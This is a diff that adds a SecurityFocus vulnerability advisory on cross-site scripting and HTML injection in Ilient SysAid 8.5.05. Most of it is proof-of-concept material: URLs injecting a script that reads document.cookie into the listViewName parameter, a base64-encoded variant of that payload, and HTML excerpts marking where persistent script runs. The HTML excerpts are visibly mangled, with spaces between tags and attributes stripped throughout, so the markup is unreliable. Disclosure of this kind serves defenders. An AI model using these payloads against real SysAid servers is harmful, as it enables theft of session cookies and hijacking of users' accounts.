@@ -1,0 +1,70 @@
+source: http://www.securityfocus.com/bid/52356/info
+
+Ilient SysAid is prone to multiple cross-site scripting and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker could leverage the cross-site scripting issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Attacker-supplied HTML and script code would run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user. Other attacks are also possible.
+
+Ilient SysAid 8.5.05 is vulnerable; other versions may also be affected. 
+
+HTML injection:
+<tablewidth="100%"cellspacing="5"cellpadding="5"border="0"class="Maxed">
+<tbody><trvalign="top"><tdwidth="50%"style="padding:10px;"id="Container_1"><tableclass="MaxedContainerContainer_1">
+<tbody><tr>
+<tdclass="Container_Header">
+<table>
+<tbody><tr>
+<tdclass="Container_Header_First">
+<tdclass="Container_Header_Center">
+Administratorsonline
+</td><tdclass="Container_Header_Last">
+</td>
+
+</tr>
+</tbody></table></td>
+</tr>
+<tr>
+<tdclass="Container_Body">
+<divclass="BorderFix_FFForm_Ctrl_Label">
+<br/>
+1Users<br/>
+JulienAhrens<EXCUTES PERSISTENT SCRIPt CODE HERE!></div></td></tr></tbody></table></td></tr></tbody>
+</table></div></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></body></html>
+
+
+
+Cross-site scripting:
+
+http://www.example.com:8080/sysaid/CustomizeListView.jsp?listName=Assets&listViewName=<script>alert(document.cookie)</script>
+
+or base64 encoded:
+http://www.example.com:8080/sysaid/CustomizeListView.jsp?listName=Service%20Requests&srType=1&listViewName= () 
+BASE64@PHNjcmlwdD5hb
+GVydChlc2NhcGUoZG9jdW1lbnQuY29va2llKSk8L3NjcmlwdD4=
+
+
+
+Non-persistent(listViewName):
+
+<tdcolspan="6"class="Frame_Body_Center">
+<tablewidth="100%"border="0"class="Maxed">
+
+<tbody><trvalign="top">
+<tdstyle="padding:10px;"id="Conainer_1">
+<tablewidth=""cellspacing="0"cellpadding="0"border="0">
+<tbody><tr>
+<td>
+<tablewidth="100%"cellspacing="0"cellpadding="0"border="0"class="MaxedContainerContainer_1">
+
+<tbody><tr>
+<tdclass="Container_Header">
+
+<table>
+<tbody><tr>
+<tdclass="Container_Header_First"/>
+<tdclass="Container_Header_Center">
+<palign="center"style="font-size:16px;">Customizelist-Assets-<EXCUTES PERSISTENT SCRIPt CODE HERE> 
+
+</p></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr>
+</tbody></table></td></tr></tbody></table></form></body></html>
